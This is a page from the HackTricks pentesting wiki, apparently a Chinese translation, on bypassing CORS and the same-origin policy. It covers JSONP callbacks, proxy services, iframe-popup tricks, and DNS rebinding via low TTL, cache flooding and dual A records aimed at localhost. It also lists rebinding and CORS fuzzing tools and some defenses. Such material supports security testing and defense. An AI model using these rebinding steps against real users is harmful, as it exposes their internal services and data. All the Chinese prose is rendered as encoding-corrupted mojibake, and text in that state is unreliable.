[**åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºä¸åŒç±»å‹çš„XSSIä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬çš„ä¿¡æ¯ã€‚**](xssi-cross-site-script-inclusion.md)

å°è¯•åœ¨è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ª**`callback`** **å‚æ•°**ã€‚ä¹Ÿè®¸é¡µé¢å·²ç»å‡†å¤‡å¥½å°†æ•°æ®ä½œä¸ºJSONPå‘é€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¡µé¢å°†ä»¥`Content-Type: application/javascript`çš„å½¢å¼å‘é€æ•°æ®ï¼Œä»è€Œç»•è¿‡CORSç­–ç•¥ã€‚

![](<../.gitbook/assets/image (229).png>)

### ç®€å•ï¼ˆæ— ç”¨ï¼Ÿï¼‰ç»•è¿‡

æ‚¨å¯ä»¥è¦æ±‚Webåº”ç”¨ç¨‹åºä»£è¡¨æ‚¨å‘å‡ºè¯·æ±‚å¹¶è¿”å›å“åº”ã€‚è¿™å°†ç»•è¿‡**`Access-Control-Allow-Origin`**ï¼Œä½†è¯·æ³¨æ„ï¼Œ**æœ€ç»ˆå—å®³è€…çš„å‡­æ®ä¸ä¼šè¢«å‘é€**ï¼Œå› ä¸ºæ‚¨å°†ä¼š**ä¸ä¸åŒçš„åŸŸ**ï¼ˆä»£è¡¨æ‚¨å‘å‡ºè¯·æ±‚çš„åŸŸï¼‰è¿›è¡Œè”ç³»ã€‚

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escapeæä¾›äº†ä¸€ä¸ª**ä»£ç†**ï¼Œå®ƒä¼šå°†æˆ‘ä»¬çš„**è¯·æ±‚**å’Œå…¶**å¤´éƒ¨**ä¸€èµ·**ä¼ é€’**ï¼Œå¹¶ä¸”è¿˜ä¼š**ä¼ªé€ **Originå¤´éƒ¨ï¼ˆOrigin = **è¯·æ±‚çš„åŸŸ**ï¼‰ã€‚å› æ­¤ï¼Œ**CORSç­–ç•¥è¢«ç»•è¿‡**ã€‚\
æºä»£ç ä½äº[Githubä¸Š](https://github.com/shalvah/cors-escape)ï¼Œå› æ­¤æ‚¨å¯ä»¥**è‡ªå·±æ‰˜ç®¡**ã€‚
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

ä»£ç†æœ‰ç‚¹åƒâ€œè½¬å‘â€ä½ çš„è¯·æ±‚ï¼Œå°±åƒä½ å‘é€çš„ä¸€æ ·ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ç§æ›¿ä»£çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿™ç§æ–¹å¼ä»ç„¶æ¶‰åŠåˆ°å…¶ä»–äººä¸ºä½ å‘å‡ºè¯·æ±‚ï¼Œä½†è¿™ä¸€æ¬¡ï¼ŒæœåŠ¡å™¨ä¼šç”¨ä½ æŒ‡å®šçš„ä»»ä½•å‚æ•°è‡ªå·±å‘å‡ºè¯·æ±‚ã€‚

### Iframe + Popup Bypass

ä½ å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªiframeå¹¶ä»ä¸­æ‰“å¼€ä¸€ä¸ªæ–°çª—å£æ¥ç»•è¿‡CORSæ£€æŸ¥ï¼Œä¾‹å¦‚`e.origin === window.origin`ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### é€šè¿‡TTLè¿›è¡ŒDNS Rebinding

![](<../.gitbook/assets/image (108).png>)

åŸºæœ¬ä¸Šï¼Œä½ è®©å—å®³è€…è®¿é—®ä½ çš„é¡µé¢ï¼Œç„¶åä½ æ”¹å˜ä½ çš„åŸŸåçš„DNSï¼ˆå³IPï¼‰ï¼Œä½¿å…¶æŒ‡å‘å—å®³è€…çš„ç½‘é¡µã€‚å½“TTLç»“æŸæ—¶ï¼Œä½ è®©å—å®³è€…æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆJSï¼‰ï¼Œè¿™æ ·å°±ä¼šå‘å‡ºæ–°çš„DNSè¯·æ±‚ï¼Œç„¶åä½ å°±èƒ½å¤Ÿæ”¶é›†ä¿¡æ¯ï¼ˆå› ä¸ºä½ å§‹ç»ˆå°†ç”¨æˆ·ä¿ç•™åœ¨ä½ çš„åŸŸåä¸­ï¼Œä»–ä¸ä¼šå‘å—å®³è€…æœåŠ¡å™¨å‘é€ä»»ä½•cookieï¼Œæ‰€ä»¥è¿™ä¸ªé€‰é¡¹æ»¥ç”¨äº†å—å®³è€…IPçš„ç‰¹æƒï¼‰ã€‚

å³ä½¿ä½ å°†TTLè®¾ç½®å¾—éå¸¸ä½ï¼ˆ0æˆ–1ï¼‰ï¼Œæµè§ˆå™¨ä¹Ÿæœ‰ä¸€ä¸ªç¼“å­˜ï¼Œä¼šé˜»æ­¢ä½ åœ¨å‡ ç§’é’Ÿ/åˆ†é’Ÿå†…æ»¥ç”¨è¿™ä¸ªåŠŸèƒ½ã€‚

å› æ­¤ï¼Œè¿™ç§æŠ€æœ¯å¯¹äºç»•è¿‡æ˜¾å¼æ£€æŸ¥å¾ˆæœ‰ç”¨ï¼ˆå—å®³è€…æ˜ç¡®æ‰§è¡ŒDNSè¯·æ±‚ä»¥æ£€æŸ¥åŸŸåçš„IPï¼Œå½“è°ƒç”¨æœºå™¨äººæ—¶ï¼Œå®ƒå°†æ‰§è¡Œè‡ªå·±çš„è¯·æ±‚ï¼‰ã€‚

æˆ–è€…å½“ä½ å¯ä»¥è®©ç”¨æˆ·/æœºå™¨äººåœ¨åŒä¸€ä¸ªé¡µé¢ä¸Šåœç•™å¾ˆé•¿æ—¶é—´ï¼ˆè¿™æ ·ä½ å°±å¯ä»¥ç­‰å¾…ç¼“å­˜è¿‡æœŸï¼‰ã€‚

å¦‚æœä½ éœ€è¦å¿«é€Ÿæ»¥ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œä½ å¯ä»¥ä½¿ç”¨åƒ[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)è¿™æ ·çš„æœåŠ¡ã€‚

å¦‚æœä½ æƒ³è¿è¡Œè‡ªå·±çš„DNS rebindingæœåŠ¡å™¨ï¼Œä½ å¯ä»¥ä½¿ç”¨åƒ[**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)è¿™æ ·çš„å·¥å…·ï¼Œç„¶åæš´éœ²ä½ çš„æœ¬åœ°ç«¯å£53/udpï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘å®ƒçš„Aè®°å½•ï¼ˆns.example.comï¼‰ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæŒ‡å‘å…ˆå‰åˆ›å»ºçš„Aå­åŸŸçš„NSè®°å½•ï¼ˆns.example.comï¼‰ã€‚\
ç„¶åï¼Œè¯¥å­åŸŸçš„ä»»ä½•å­åŸŸï¼ˆns.example.comï¼‰éƒ½å°†ç”±ä½ çš„ä¸»æœºè§£æã€‚

è¿˜å¯ä»¥åœ¨[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)ä¸ŠæŸ¥çœ‹å…¬å¼€è¿è¡Œçš„æœåŠ¡å™¨ã€‚

### é€šè¿‡**DNSç¼“å­˜æ´ªæ³›**è¿›è¡ŒDNS Rebinding

æ­£å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼Œ**æµè§ˆå™¨**å°†åŸŸåçš„IPåœ°å€**ç¼“å­˜çš„æ—¶é—´æ¯”TTLæŒ‡å®šçš„æ—¶é—´é•¿**ã€‚ç„¶è€Œï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ç§é˜²å¾¡ã€‚

ä½ å¯ä»¥æœ‰ä¸€ä¸ªæœåŠ¡å·¥ä½œè€…ï¼Œå®ƒå°†**æ´ªæ³›DNSç¼“å­˜ä»¥å¼ºåˆ¶è¿›è¡Œç¬¬äºŒä¸ªDNSè¯·æ±‚**ã€‚æ‰€ä»¥æµç¨‹å°†æ˜¯è¿™æ ·çš„ï¼š

1. DNSè¯·æ±‚å“åº”ä¸ºæ”»å‡»è€…åœ°å€
2. æœåŠ¡å·¥ä½œè€…æ´ªæ³›DNSç¼“å­˜ï¼ˆåˆ é™¤äº†ç¼“å­˜çš„æ”»å‡»è€…æœåŠ¡å™¨åç§°ï¼‰
3. ç¬¬äºŒä¸ªDNSè¯·æ±‚ï¼Œè¿™æ¬¡å“åº”ä¸º127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_è“è‰²æ˜¯ç¬¬ä¸€ä¸ªDNSè¯·æ±‚ï¼Œæ©™è‰²æ˜¯æ´ªæ³›ã€‚_

### é€šè¿‡**ç¼“å­˜**è¿›è¡ŒDNS Rebinding

æ­£å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼Œ**æµè§ˆå™¨**å°†åŸŸåçš„IPåœ°å€**ç¼“å­˜çš„æ—¶é—´æ¯”TTLæŒ‡å®šçš„æ—¶é—´é•¿**ã€‚ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§ç»•è¿‡è¿™ç§é˜²å¾¡çš„æ–¹æ³•ã€‚

ä½ å¯ä»¥åœ¨**DNSæä¾›å•†**ä¸­ä¸º**åŒä¸€ä¸ªå­åŸŸ**åˆ›å»º**2ä¸ªAè®°å½•**ï¼ˆæˆ–**1ä¸ªå¸¦æœ‰2ä¸ªIPçš„Aè®°å½•**ï¼‰ï¼Œå½“æµè§ˆå™¨æ£€æŸ¥å®ƒä»¬æ—¶ï¼Œå®ƒå°†å¾—åˆ°ä¸¤è€…ã€‚

ç°åœ¨ï¼Œå¦‚æœ**æµè§ˆå™¨å†³å®šé¦–å…ˆä½¿ç”¨æ”»å‡»è€…IPåœ°å€**ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿæä¾›å°†**æ‰§è¡ŒHTTPè¯·æ±‚**åˆ°åŒä¸€**åŸŸ**çš„**æœ‰æ•ˆè´Ÿè½½**ã€‚ç„¶è€Œï¼Œç°åœ¨æ”»å‡»è€…çŸ¥é“å—å®³è€…çš„IPï¼Œ**ä»–å°†åœæ­¢å›ç­”å—å®³è€…çš„æµè§ˆå™¨**ã€‚

å½“æµè§ˆå™¨å‘ç°**åŸŸåå¯¹ä»–ä¸å“åº”**æ—¶ï¼Œå®ƒå°†**ä½¿ç”¨ç»™å®šçš„ç¬¬äºŒä¸ªIP**ï¼Œè¿™æ ·ä»–å°†**ç»•è¿‡SOPè®¿é—®ä¸åŒçš„ä½ç½®**ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è·å–ä¿¡æ¯å¹¶å°†å…¶å¤–æ³„ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†è®¿é—®æœ¬åœ°ä¸»æœºï¼Œä½ åº”è¯¥å°è¯•åœ¨Windowsä¸­é‡æ–°ç»‘å®š**127.0.0.1**ï¼Œåœ¨Linuxä¸­é‡æ–°ç»‘å®š**0.0.0.0**ã€‚\
åƒgodaddyæˆ–cloudflareè¿™æ ·çš„æä¾›å•†ä¸å…è®¸æˆ‘ä½¿ç”¨IP 0.0.0.0ï¼Œä½†AWS route53å…è®¸æˆ‘åˆ›å»ºä¸€ä¸ªå¸¦æœ‰2ä¸ªIPçš„Aè®°å½•ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯"0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§[https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### å…¶ä»–å¸¸è§ç»•è¿‡æ–¹å¼

* å¦‚æœ**ä¸å…è®¸ä½¿ç”¨å†…éƒ¨IP**ï¼Œå¯èƒ½**å¿˜è®°ç¦æ­¢0.0.0.0**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸ä½¿ç”¨å†…éƒ¨IP**ä½œä¸ºDNSå“åº”ï¼Œä½ å¯ä»¥å°†**CNAMEå“åº”**è¿”å›ç»™**localhost**ï¼ˆåœ¨Linuxå’ŒMacä¸Šæœ‰æ•ˆï¼‰
* å¦‚æœ**ä¸å…è®¸ä½¿ç”¨å†…éƒ¨IP**ä½œä¸ºDNSå“åº”ï¼Œä½ å¯ä»¥å°†**CNAMEå“åº”**è¿”å›ç»™**å†…éƒ¨æœåŠ¡**ï¼Œä¾‹å¦‚www.corporate.internalã€‚

### æ­¦å™¨åŒ–çš„DNS Rebinding

ä½ å¯ä»¥åœ¨æ¼”è®²[Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ)ä¸­æ‰¾åˆ°æœ‰å…³å‰é¢ç»•è¿‡æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ä»¥åŠå¦‚ä½•ä½¿ç”¨ä»¥ä¸‹å·¥å…·ã€‚

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)æ˜¯ä¸€ä¸ªç”¨äºæ‰§è¡Œ[DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding)æ”»å‡»çš„å·¥å…·ã€‚å®ƒåŒ…æ‹¬å°†æ”»å‡»æœåŠ¡å™¨DNSåç§°çš„IPåœ°å€é‡æ–°ç»‘å®šåˆ°ç›®æ ‡æœºå™¨çš„IPåœ°å€ä»¥åŠæä¾›æ”»å‡»æœ‰æ•ˆè´Ÿè½½ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šçš„æ˜“å—æ”»å‡»è½¯ä»¶æ‰€éœ€çš„ç»„ä»¶ã€‚
### é˜²æ­¢ DNS é‡ç»‘å®šçš„çœŸå®ä¿æŠ¤æªæ–½

* åœ¨å†…éƒ¨æœåŠ¡ä¸­ä½¿ç”¨ TLS
* è¯·æ±‚èº«ä»½éªŒè¯ä»¥è®¿é—®æ•°æ®
* éªŒè¯ Host æ ‡å¤´
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/)ï¼šå»ºè®®åœ¨å…¬å…±æœåŠ¡å™¨è¦è®¿é—®å†…éƒ¨æœåŠ¡å™¨æ—¶å§‹ç»ˆå‘é€é¢„æ£€è¯·æ±‚

## **å·¥å…·**

**æ¨¡ç³Šæµ‹è¯• CORS ç­–ç•¥ä¸­çš„å¯èƒ½é…ç½®é”™è¯¯**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## å‚è€ƒèµ„æ–™

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š** å—ï¼Ÿæˆ–è€…æƒ³è¦è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
